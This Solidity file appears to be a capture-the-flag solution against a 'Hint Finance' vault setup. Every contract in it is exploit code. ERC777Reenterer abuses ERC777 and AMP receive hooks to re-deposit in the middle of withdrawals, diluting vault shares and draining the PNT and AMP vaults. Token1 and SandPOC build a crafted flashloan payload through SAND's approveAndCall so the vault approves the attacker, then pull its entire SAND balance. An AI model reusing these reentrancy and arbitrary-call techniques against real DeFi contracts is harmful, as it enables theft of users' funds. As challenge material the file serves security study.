// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.13;

import  "./Setup.sol";
import  "./HintFinanceVault.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 interfaceHash,
        address implementer
    ) external;
}

contract ERC777Reenterer {
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
       keccak256("ERC777TokensRecipient");

    IERC1820Registry internal constant _ERC1820_REGISTRY =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 private constant _AMP_INTERFACE_HASH =
        keccak256("AmpTokensRecipient");

    HintFinanceVault internal immutable pntVault;
    HintFinanceVault internal immutable ampVault;
   

    address pntAddr = 0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD;
    address ampAddr = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;

    bool internal doReDeposit = true;

    constructor(address _pntVault, address _ampVault) {
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(0),
            _TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(0),
            _AMP_INTERFACE_HASH,
            address(this)
        );       
        pntVault = HintFinanceVault(_pntVault);
        ampVault = HintFinanceVault(_ampVault);
     
    }

    function depositPnt() public  {
        ERC20Like pnt = ERC20Like(pntVault.underlyingToken());
        pnt.approve(address(pntVault), type(uint256).max);
        pntVault.deposit(pnt.balanceOf(address(this)));
    }

    function depositAmp() public  {
        ERC20Like amp = ERC20Like(ampVault.underlyingToken());
        amp.approve(address(ampVault), type(uint256).max);
        ampVault.deposit(amp.balanceOf(address(this)));
    }

    function doPntDiluteCycle() public  {
        pntVault.withdraw(pntVault.balanceOf(address(this)));
    }

    function doAmpDiluteCycle() public  {
        ampVault.withdraw(ampVault.balanceOf(address(this)));
    }

    function cashOutPnt() public  {
        ERC20Like pnt = ERC20Like(pntVault.underlyingToken());
        doReDeposit = false;
        pntVault.withdraw(pntVault.balanceOf(address(this)));
        doReDeposit = true;
        pnt.transfer(msg.sender, pnt.balanceOf(address(this)));
    }

    function cashOutAmp() public  {
        ERC20Like amp = ERC20Like(ampVault.underlyingToken());
        doReDeposit = false;
        ampVault.withdraw(ampVault.balanceOf(address(this)));
        doReDeposit = true;
        amp.transfer(msg.sender, amp.balanceOf(address(this)));
    }
    function _buyWithEth(
        address _token,
        uint256 _amount,
        address _recipient
    ) internal {
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = _token;
        UniswapV2RouterLike(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a)
            .swapExactETHForTokens{value: _amount}(
            0,
            path,
            _recipient,
            block.timestamp + 7 days
        );
    }

    function test() public payable {

        _buyWithEth(pntAddr, 100 ether, address(this));
        depositPnt();
        doPntDiluteCycle();
        doPntDiluteCycle();
        doPntDiluteCycle();
        doPntDiluteCycle();
        cashOutPnt();

        _buyWithEth(ampAddr, 100 ether, address(this));
        depositAmp();
        doAmpDiluteCycle();
        doAmpDiluteCycle();
        doAmpDiluteCycle();
        doAmpDiluteCycle();
        cashOutAmp();
    }


    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (operator == address(pntVault) && doReDeposit) {
            ERC20Like pnt = ERC20Like(pntVault.underlyingToken());
            pntVault.deposit(pnt.balanceOf(address(this)));
        }
    }

    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        if (operator == address(ampVault) && doReDeposit) {
            ERC20Like amp = ERC20Like(ampVault.underlyingToken());
            ampVault.deposit(amp.balanceOf(address(this)));
        }
    }
}
interface ISand  {
    function approveAndCall(address _target,uint256 _amount,bytes calldata _data) external;
    function balanceOf(address who) external view returns (uint);
    function transferFrom(address src, address dst, uint qty) external returns (bool);
}

contract Token1 {
    fallback() external {}

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1e18;
    }

    function Sandtest(address _sandVault, ISand _sand) external {
        bytes memory innerPayload = abi.encodeWithSelector(
            bytes4(0x00000000),
            _sandVault,
            bytes32(0),
            bytes32(0),
            bytes32(0)
        );
        bytes memory payload = abi.encodeCall(
            HintFinanceVault.flashloan,
            (address(this), 0xa0, innerPayload)
        );
        _sand.approveAndCall(_sandVault, type(uint256).max, payload);
        _sand.transferFrom(_sandVault, msg.sender, _sand.balanceOf(_sandVault));
    }
}

contract SandPOC  {
   Setup setup = Setup(0xB40a90fdB0163cA5C82D1959dB7e56B50A0dC016);

   ISand sand = ISand(0x3845badAde8e6dFF049820680d1F14bD3903a5d0);


    function test() public {
        HintFinanceVault sandVault = HintFinanceVault(
            setup.hintFinanceFactory().underlyingToVault(address(sand))
        );
        Token1 token1 = new Token1();
        token1.Sandtest(address(sandVault), sand);

    }
}